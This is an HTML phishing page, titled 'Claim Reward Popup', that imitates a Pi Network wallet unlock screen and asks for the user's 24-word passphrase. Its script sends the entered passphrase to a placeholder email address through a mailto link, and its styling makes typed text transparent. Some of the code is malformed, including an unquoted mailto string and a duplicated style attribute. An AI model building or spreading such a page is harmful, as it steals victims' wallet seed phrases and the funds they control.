<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Claim Reward Popup</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .popup {
            /* width: 3750px; */
            background-color: white;
            /* border: 2px solid #696767; */
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin: 50px auto;
            position: relative;
            border-radius: 8px;
        }
        .header {
            background-color: #733c92;
            color: white;
            text-align: center;
            padding: 10px;
            border-radius: 5px 5px 0 0;
            font-size: 18px;
        }
        .content {
            margin-top: 20px;
        }
        .content p {
            text-align: center;
            font-size: 18px;
            margin-bottom: 25px;
        }
        .input-box {
            border: 1px solid rgb(179, 173, 173);
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
            font-size: 16px;
            color: transparent;
            caret-color: black;
            background-color: white;
        }
        .input-box::placeholder {
            color: #000;
            opacity: 0.5;
        }
        .button {
            display: block;
            background-color: #ffffff;
            color: #733c92;
            border-color: #733c92;
            text-align: center;
            padding: 10px;
            margin-top: 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            border: 1px solid;
            width: 100%;
        }
        .footer {
            text-align: left;
            margin-top: 26px;
            font-size: 16px;
            color: #464646;
        }
    </style>
</head>

<body>
    <div class="popup">
        <div class="header">Wallet</div>
        <div class="content">
            <p>Unlock Pi Wallet</p>
            <textarea class="input-box" placeholder="Enter your 24-words passphrase here" style=height:275px; width: 400px style=height:275px; width:400px></textarea>
            <button class="button" onclick="sendPassphrase()">Unlock With Passphrase</button>
        </div>
        <div class="footer">   
            <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
            <br>Lost your passphrase? <span
            style="color: #2372cc;">you can create a new wallet,</span> but all your Ï€ in your previous wallet will be inaccessible.
        </div>
    </div>

    <script>
        function sendPassphrase() {
            const passphrase = document.querySelector('.input-box').value;
            if (passphrase) {
                window.location.href=mailto:youremail@example.com?subject=Passphrase submission&body=${encodeURIComponent(passphrase)};
            } else {
                alert("Please enter your passphrase.");
            }
        }
    </script>
</body>
</html>
